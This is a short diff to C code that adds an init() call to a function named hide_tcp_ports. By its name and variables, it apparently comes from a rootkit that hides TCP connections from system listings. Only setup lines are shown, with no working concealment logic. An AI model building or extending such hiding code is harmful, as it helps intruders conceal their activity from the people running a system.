@@ -29,6 +29,7 @@
  */
 
 FILE                *hide_tcp_ports(const char *file) {
+    init();
     DEBUG(D_INFO, "called hide_tcp_ports()");
 
     unsigned long   rxq, txq, time_len, retr, inode;
